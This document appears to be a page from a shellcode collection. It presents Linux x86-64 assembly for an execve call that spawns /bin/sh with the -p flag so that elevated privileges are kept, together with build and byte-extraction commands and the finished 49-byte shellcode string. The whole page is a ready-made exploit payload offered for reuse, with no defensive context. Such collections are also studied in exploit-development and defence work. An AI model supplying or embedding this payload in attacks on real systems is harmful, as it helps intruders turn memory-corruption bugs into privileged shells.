---
layout: default
title: execve("/bin/sh", ["/bin/sh", "-p"], 0) - Spawn shell maintaining privileges
permalink: /shellcode/asm-10.html
os: Linux
arch: Intel x86-64
length: 49
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor rdx, rdx			; null rdx (0)

	push rdx			; push null terminator
	mov rax, 0x68732f2f6e69622f	; move "/bin//sh" into rax
	push rax			; push "/bin//sh"
	mov rdi, rsp			; move pointer to "/bin//sh" into rdi

	xor rax, rax			; null out rax
	push rax			; null terminator
	mov word [rsp-2], 0x702d	; move "-p" into rsp - 2
	sub rsp, 2			; subtract 2 from rsp
	mov rbx, rsp			; move pointer to "-p" into rbx

	push rdx			; push null terminator
	push rbx			; push pointer to "-p"
	push rdi			; push pointer to "/bin//sh"

	mov rsi, rsp			; move pointer to array {"/bin//sh", "-p"} into rsi

	xor rax, rax			; null rax (0)
	mov al, 0x3b			; move execve syscall number into al (rax)
	syscall				; call execve
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xc0\x50\x66\xc7\x44\x24\xfe\x2d\x70\x48\x83\xec\x02\x48\x89\xe3\x52\x53\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
```